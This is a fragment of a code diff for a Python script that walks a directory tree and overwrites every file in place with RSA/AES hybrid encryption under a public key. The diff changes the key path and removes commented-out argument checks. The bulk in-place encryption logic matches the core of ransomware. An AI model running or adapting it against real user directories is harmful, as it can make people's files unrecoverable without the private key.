@@ -10,7 +10,7 @@ def Encrypt(filename):
         data = f.read()
     with open(filename, 'wb') as out_file:
         # 收件人秘钥 - 公钥
-        recipient_key = RSA.import_key(open('my_public_rsa_key.pem').read())
+        recipient_key = RSA.import_key(open('Encrypt_And_Decrypt/my_public_rsa_key.pem').read())
         session_key = get_random_bytes(16)
         # Encrypt the session key with the public RSA key
         cipher_rsa = PKCS1_OAEP.new(recipient_key)
@@ -24,30 +24,10 @@ def Encrypt(filename):
 
 def Work_Encrypt(rootDir): 
     list_dirs = os.walk(rootDir) 
-    # flag = 0;
     for root, dirs, files in list_dirs: 
-        # flag = 1;
-        # if(files == []):
-        #     print("No Files In The Current Directory")
-        # 切换加密和解密过程
         if True:
-            # 遍历文件，加密
             for f in files: 
                 filename = os.path.join(root, f)
-                # print("Encrypt the file: " + filename)
+                print("Encrypt the file: " + filename)
                 Encrypt(filename)
-    #     else:
-    #         print("Wrong parameters")
-    #         return
-    # if(flag == 0):
-    #     print("Current Directory Does Not Exist")
-
-    # if(len(sys.argv) > 2): 
-    #     d = sys.argv[2]
-    #     Flag = sys.argv[1]
-    #     if(Flag == 'encrypt'):
-    #         Main(d, Flag)
-    #     else: print("Wrong parameters")
-    # elif(len(sys.argv) == 2):
-    #     print("Miss address or command:'encrypt'")
-    # else: print("Miss address and command:'encrypt'")
+                
